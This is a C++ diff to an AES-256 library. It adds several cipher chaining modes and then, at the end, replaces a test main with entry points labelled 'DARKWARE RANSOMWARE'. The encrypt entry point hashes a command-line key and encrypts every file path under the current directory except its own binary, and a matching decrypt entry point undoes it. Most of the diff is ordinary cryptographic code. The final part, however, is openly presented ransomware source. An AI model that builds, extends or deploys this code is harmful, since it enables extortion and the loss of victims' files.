@@ -6,6 +6,7 @@
 #include <sys/types.h>
 #include <sys/statvfs.h>
 #include <sys/sysinfo.h>
+
 using namespace std;
 
 #if defined SHREDDER
@@ -35,6 +36,11 @@ bool CheckUser(){
 }
 #endif
 
+/*
+    * SOURCE FROM http://csrc.nist.gov/ !
+*/
+#include <cstdio>
+
 AES256::AES256(std::string const & key,
                std::string const & seed,
                Chaining_Mode       chaining_mode,
@@ -47,16 +53,6 @@ AES256::AES256(std::string const & key,
     set_padding_mode(padding_mode);
 }
 
-
-/*---------------------------------------------*
- * Constructor without a seed for random generator, only
- * the 32 byte key is required. The optional second and
- * third arguments select the "chaining mode" and the the
- * "padding mode" and default to Cipher Block Chaining
- * (CBC) and ISO/IEC 7816-4 padding. This constructor
- * should only be used when a different IV is set for each
- * new encryption or during testing!
- *---------------------------------------------*/
 
 AES256::AES256(std::string const & key,
                Chaining_Mode       chaining_mode,
@@ -82,6 +78,41 @@ AES256::set_chaining_mode(Chaining_Mode mode)
     // in the new mode
 
     switch (mode) {
+    case ECB :
+        enc = &AES256::ecb;
+        dec = &AES256::ecb_inv;
+        m_use_padding = true;
+        break;
+
+    case CBC :
+        enc = &AES256::cbc;
+        dec = &AES256::cbc_inv;
+        m_use_padding = true;
+        break;
+
+    case PCBC :
+        enc = &AES256::pcbc;
+        dec = &AES256::pcbc_inv;
+        m_use_padding = true;
+        break;
+
+    case CFB128 :
+        enc = &AES256::cfb128;
+        dec = &AES256::cfb128_inv;
+        m_use_padding = false;
+        break;
+
+    case CFB8 :
+        enc = &AES256::cfb8;
+        dec = &AES256::cfb8_inv;
+        m_use_padding = false;
+        break;
+
+    case OFB :
+        enc = dec = &AES256::ofb;
+        m_use_padding = false;
+        break;
+
     case CTR :
         enc = dec = &AES256::ctr;
         m_use_padding = false;
@@ -162,18 +193,79 @@ AES256::uses_padding() const
     return m_use_padding;
 }
 
+
+/*---------------------------------------------*
+ * Encrypts a string, returning a new one. There's always padding
+ * added to make the result length an integer multiple of 16 (even
+ * for strings with a length divisible by 16), filled with random
+ * bytes and with the very last byte indicating how many of the
+ *  bytes of the last 16-byte block belong to the encoded string.
+ *---------------------------------------------*/
+
+std::string
+AES256::encrypt(std::string const & in,
+                bool                no_padding_block)
+{
+    std::string out;
+
+    // If necessary create a new IV and put the IV into the output string
+    // first (except for ECB mode)
+
+    if (m_mode != ECB) {
+        if (m_use_random_IV)
+            m_prng.get_block(m_IV);
+
+        out.append(m_IV.as_string());
+    }
+
+    // Encrypt all blocks of the message
+
+    size_t len = in.size();
+    for (size_t i = 0; i < len; i += 16) {
+        Byte_Block<16> buf(in, i);
+        out.append((this->*enc)(buf).as_string());
+    }
+
+    // For chaining modes that don't need padding only keep as many
+    // bytes as were in the input. For others, if the input had a length
+    // of an integer multiple of 16 (and we're not asked to leave it out),
+    // append a full 16 byte block of padding.
+
+    if (! m_use_padding) {
+        out.erase(len + 16);
+    } else if (len % 16 == 0 && ! no_padding_block) {
+        Byte_Block<16> buf;
+        out.append((this->*enc)(buf).as_string());
+    }
+
+    return out;
+}
+
+
 /*---------------------------------------------*
  * Encrypts data from a std::istream, writing the
  * result to a std::ostream.
  *---------------------------------------------*/
 
-std::ostream &AES256::encrypt(std::istream & in, std::ostream &out, bool no_padding_block)
+std::ostream &
+AES256::encrypt(std::istream & in,
+                std::ostream & out,
+                bool           no_padding_block)
 {
     // Make sure streams can read from and written to
 
     if (in.fail() || out.fail())
         throw std::invalid_argument("Bad input or output stream");
 
+    // If necessary create a new IV and put the IV into the output stream
+    // first (except for ECB mode)
+
+    if (m_mode != ECB) {
+        if (m_use_random_IV)
+            m_prng.get_block(m_IV);
+
+        out.write(m_IV, 16);
+    }
 
     // Encrypt and write out all 16 byte long segments of the message
 
@@ -216,6 +308,13 @@ AES256::decrypt(std::string const & in,
     bool bad_len = false;
 
     switch (m_mode) {
+    case ECB :
+        bad_len  = len < 16 || len % 16;
+        break;
+
+    case CFB128 :
+    case CFB8 :
+    case OFB :
     case CTR :
         bad_len = len < 16;
         break;
@@ -231,7 +330,11 @@ AES256::decrypt(std::string const & in,
     // Get the IV, it's the first block of 16 bytes (except in ECB mode
     // which doesn't use one)
 
-    size_t start = 16;
+    size_t start = 0;
+    if (m_mode != ECB) {
+        m_IV = Byte_Block<16>(in);
+        start = 16;
+    }
 
     // Decrypt what remains
 
@@ -264,6 +367,12 @@ AES256::decrypt(std::istream & in,
 
     if (in.bad() || out.bad())
         throw std::invalid_argument("Bad input or output stream");
+
+    // Get the IV, it's the first 16 bytes (except in ECB mode which does
+    // not use an IV)
+
+    if (m_mode != ECB && ! in.read(m_IV, 16))
+        throw std::invalid_argument("Bad input stream");
         
     // Decrypt what else we can read in
 
@@ -301,6 +410,188 @@ AES256::decrypt(std::istream & in,
 }
 
 
+/*---------------------------------------------*
+ * Electronic Codebook (ECB) mode encryption
+ *---------------------------------------------*/
+
+Byte_Block<16> &
+AES256::ecb(Byte_Block<16> & buf)
+{
+    return m_aes256_base.encrypt(buf);
+}
+
+
+/*---------------------------------------------*
+ * Electronic Codebook (ECB) mode decryption
+ *---------------------------------------------*/
+
+Byte_Block<16> &
+AES256::ecb_inv(Byte_Block<16> & buf)
+{
+    return m_aes256_base.decrypt(buf);
+}
+
+
+/*---------------------------------------------*
+ * Cipher Block Chaining (CBC) mode encryption
+ *---------------------------------------------*/
+
+Byte_Block<16> &
+AES256::cbc(Byte_Block<16> & buf)
+{
+    buf ^= m_IV;
+    m_aes256_base.encrypt(buf);
+    m_IV = buf;
+
+    return buf;
+}
+
+
+/*---------------------------------------------*
+ * Cipher Block Chaining (CBC) mode decryption
+ *---------------------------------------------*/
+
+Byte_Block<16> &
+AES256::cbc_inv(Byte_Block<16> & buf)
+{
+    Byte_Block<16> tmp(buf);
+
+    m_aes256_base.decrypt(buf);
+    buf ^= m_IV;
+    m_IV = tmp;
+
+    return buf;
+}
+
+
+/*---------------------------------------------*
+ * Propagating Cipher Block Chaining (PCBC) mode encryption
+ *---------------------------------------------*/
+
+Byte_Block<16> &
+AES256::pcbc(Byte_Block<16> & buf)
+{
+    Byte_Block<16> tmp(buf);
+    
+    buf ^= m_IV;
+    m_aes256_base.encrypt(buf);
+    m_IV = buf ^ tmp;
+
+    return buf;
+}
+
+
+/*---------------------------------------------*
+ * Propagating Cipher Block Chaining (PCBC) mode decryption
+ *---------------------------------------------*/
+
+Byte_Block<16> &
+AES256::pcbc_inv(Byte_Block<16> & buf)
+{
+    Byte_Block<16> tmp(buf);
+
+    m_aes256_base.decrypt(buf);
+    buf ^= m_IV;
+    m_IV = buf ^ tmp;
+
+    return buf;
+}
+
+
+/*---------------------------------------------*
+ * Cipher Feedback 128 (CFB-128) mode encryption
+ *---------------------------------------------*/
+
+Byte_Block<16> &
+AES256::cfb128(Byte_Block<16> & buf)
+{
+    m_aes256_base.encrypt(m_IV);
+    m_IV = buf ^= m_IV;
+    return buf;
+}
+
+
+/*---------------------------------------------*
+ * Cipher Feedback 128 (CFB-128) mode decryption
+ *---------------------------------------------*/
+
+Byte_Block<16> &
+AES256::cfb128_inv(Byte_Block<16> & buf)
+{
+    Byte_Block<16> tmp(m_IV);
+
+    m_aes256_base.encrypt(tmp);
+    m_IV = buf;
+
+    return buf ^= tmp;
+}
+
+
+/*---------------------------------------------*
+ * Cipher Feedback 8 (CFB-8) mode encryption
+ *---------------------------------------------*/
+
+Byte_Block<16> &
+AES256::cfb8(Byte_Block<16> & buf)
+{
+    // Encrypt byte-wise up to the known length of "good" bytes
+    // in the block - encrypting more would mess up the current
+    // state of the IV, which would result in the Monte Carlo
+    //  tests from the NIST test suite to fail.
+
+    for (size_t i = 0; i < buf.init_len(); ++i) {
+        Byte_Block<16> tmp(m_IV);
+
+        m_aes256_base.encrypt(tmp);
+        buf[i] ^= tmp[0];
+        m_IV <<= 8;
+        m_IV[15] = buf[i];
+    }
+
+    return buf;
+}
+
+
+/*---------------------------------------------*
+ * Cipher Feedback 8 (CFB-8) mode decryption
+ *---------------------------------------------*/
+
+Byte_Block<16> &
+AES256::cfb8_inv(Byte_Block<16> & buf)
+{
+    Byte_Block<16> shift_reg(m_IV);
+
+    // Decrypt byte-wise up to the known length of "good" bytes
+    // in the block - decrypting more would mess up the current
+    // state of the IV, which would result in the Monte Carlo
+    //  tests from the NIST test suite to fail.
+
+    for (size_t i = 0; i < buf.init_len(); ++i) {
+        Byte_Block<16> stmp(shift_reg);
+
+        m_aes256_base.encrypt(stmp);
+        byte tmp = buf[i] ^ stmp[0];
+        shift_reg <<= 8;
+        shift_reg[15] = buf[i];
+        buf[i] = tmp;
+    }
+
+    m_IV = shift_reg;
+    return buf;
+}
+
+
+/*---------------------------------------------*
+ * Output Feedback (OFB) mode encryption and decryption
+ *---------------------------------------------*/
+
+Byte_Block<16> &
+AES256::ofb(Byte_Block<16> & buf)
+{
+    m_aes256_base.encrypt(m_IV);
+    return buf ^= m_IV;
+}
+
 
 /*---------------------------------------------*
  * Counter (CTR) mode encryption and decryption
@@ -314,16 +605,47 @@ AES256::ctr(Byte_Block<16> & buf)
     m_aes256_base.encrypt(tmp);
     return buf ^= tmp;
 }
-
-#if defined AES256_FILE
+/*
+The main function of DARKWARE RANSOMWARE
+*/
+#if defined DARKWARE_RANSOMWARE_ENC
 
 #include "crypt/md5.hpp"
 #include <fstream>
 
-int main(){
-    std::cout<<RANDOM::HASH(RANDOM::STR(16))<<std::endl;
+int main(int argc, char *argv[]){
+    char *last_slash = strrchr(argv[0], '/');
+    char FNAME[PATH_MAX];
+    strcpy(FNAME, last_slash + 1);
+    if (argv[1]==NULL)
+    {
+        cout<<"YOU CAN'T ENCRYPT WITHOUT KEY !"<<endl;
+    }
+    else{
+        string KEY=RANDOM::HASH(argv[1]);
+        RANDOM::ENCPATH(".",KEY,FNAME);
+        return 0;
+    }
+}
+#endif
+
+#if defined DARKWARE_RANSOMWARE_DEC
+
+#include "crypt/md5.hpp"
+#include <fstream>
+
+int main(int argc, char *argv[]){
+    char *last_slash = strrchr(argv[0], '/');
+    char FNAME[PATH_MAX];
+    strcpy(FNAME, last_slash + 1);
+    if (argv[1]==NULL){
+        cout<<"YOU MUST PUT KEY !"<<endl;
+        exit(1);
+    }
+    else{
+        RANDOM::DECPATH(".",argv[1],FNAME);
+    }
     return 0;
 
 }
-
 #endif
